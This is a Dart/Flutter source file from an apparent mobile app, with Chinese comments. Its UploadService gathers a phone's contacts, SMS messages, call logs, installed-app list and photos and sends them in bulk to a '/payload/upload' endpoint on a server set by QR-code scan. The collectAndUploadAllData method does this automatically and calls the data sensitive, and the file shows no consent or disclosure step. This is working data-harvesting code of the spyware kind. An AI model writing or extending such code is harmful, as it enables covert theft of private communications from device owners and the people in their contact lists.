import 'dart:io';

import '../../core/config/app_config.dart';
import '../../services/api/api_service.dart';
import 'contacts_service.dart';
import 'sms_service.dart';
import 'call_log_service.dart';
import 'photo_service.dart';

/// 数据上传服务
/// 统一管理敏感数据的上传
class UploadService {
  static final UploadService instance = UploadService._internal();
  UploadService._internal();
  
  final ApiService _apiService = ApiService();
  
  /// 上传结构化数据（应用列表、通讯录、短信、通话记录）
  /// 
  /// [appList] 应用列表
  /// [contacts] 通讯录
  /// [sms] 短信
  /// [callRecords] 通话记录
  Future<bool> uploadStructuredData({
    List<Map<String, dynamic>>? appList,
    List<Map<String, dynamic>>? contacts,
    List<Map<String, dynamic>>? sms,
    List<Map<String, dynamic>>? callRecords,
  }) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('API 地址未配置，请先扫码');
      }
      
      final data = <String, dynamic>{};
      
      if (appList != null && appList.isNotEmpty) {
        data['app_list'] = appList;
      }
      
      if (contacts != null && contacts.isNotEmpty) {
        data['contacts'] = contacts;
      }
      
      if (sms != null && sms.isNotEmpty) {
        data['sms'] = sms;
      }
      
      if (callRecords != null && callRecords.isNotEmpty) {
        data['call_records'] = callRecords;
      }
      
      if (data.isEmpty) {
        throw Exception('没有数据需要上传');
      }
      
      final response = await _apiService.post('/payload/upload', data: data);
      return response != null;
    } catch (e) {
      throw Exception('上传结构化数据失败: $e');
    }
  }
  
  /// 上传图片文件
  /// 
  /// [photoFile] 图片文件
  /// 
  /// 返回图片ID
  Future<String?> uploadPhoto(File photoFile) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('API 地址未配置，请先扫码');
      }
      
      if (!await photoFile.exists()) {
        throw Exception('图片文件不存在');
      }
      
      final response = await _apiService.uploadFile(
        '/files/upload-photo',
        photoFile.path,
        fieldName: 'file',
      );
      
      if (response != null && response['photo_id'] != null) {
        return response['photo_id'] as String;
      }
      
      return null;
    } catch (e) {
      throw Exception('上传图片失败: $e');
    }
  }
  
  /// 批量上传图片
  /// 
  /// [photoFiles] 图片文件列表
  /// 
  /// 返回图片ID列表
  Future<List<String>> uploadPhotos(List<File> photoFiles) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('API 地址未配置，请先扫码');
      }
      
      final photoIds = <String>[];
      
      for (final photoFile in photoFiles) {
        if (await photoFile.exists()) {
          final photoId = await uploadPhoto(photoFile);
          if (photoId != null) {
            photoIds.add(photoId);
          }
        }
      }
      
      return photoIds;
    } catch (e) {
      throw Exception('批量上传图片失败: $e');
    }
  }
  
  /// 上传相册元数据
  /// 
  /// [photoMetadata] 相册元数据列表
  Future<bool> uploadPhotoMetadata(List<Map<String, dynamic>> photoMetadata) async {
    try {
      if (!AppConfig.instance.isConfigured) {
        throw Exception('API 地址未配置，请先扫码');
      }
      
      final response = await _apiService.post(
        '/payload/upload',
        data: {
          'photo_metadata': photoMetadata,
        },
      );
      
      return response != null;
    } catch (e) {
      throw Exception('上传相册元数据失败: $e');
    }
  }
  
  /// 收集并上传所有敏感数据
  /// 
  /// 自动收集通讯录、短信、通话记录、相册数据并上传
  Future<Map<String, dynamic>> collectAndUploadAllData() async {
    final result = <String, dynamic>{
      'success': true,
      'errors': <String>[],
    };
    
    try {
      // 收集通讯录
      try {
        final contacts = await ContactsDataService.instance.getAllContacts();
        if (contacts.isNotEmpty) {
          await uploadStructuredData(contacts: contacts);
          result['contacts_count'] = contacts.length;
        }
      } catch (e) {
        result['errors'].add('通讯录: $e');
      }
      
      // 收集短信（仅 Android）
      try {
        final sms = await SMSService.instance.getAllSms();
        if (sms.isNotEmpty) {
          await uploadStructuredData(sms: sms);
          result['sms_count'] = sms.length;
        }
      } catch (e) {
        result['errors'].add('短信: $e');
      }
      
      // 收集通话记录（仅 Android）
      try {
        final callRecords = await CallLogService.instance.getAllCallLogs();
        if (callRecords.isNotEmpty) {
          await uploadStructuredData(callRecords: callRecords);
          result['call_records_count'] = callRecords.length;
        }
      } catch (e) {
        result['errors'].add('通话记录: $e');
      }
      
      // 收集相册（需要用户选择或使用原生代码获取所有图片）
      // 这里暂时跳过，需要实现原生代码
      
      if (result['errors'].isNotEmpty) {
        result['success'] = false;
      }
    } catch (e) {
      result['success'] = false;
      result['errors'].add('收集数据失败: $e');
    }
    
    return result;
  }
}
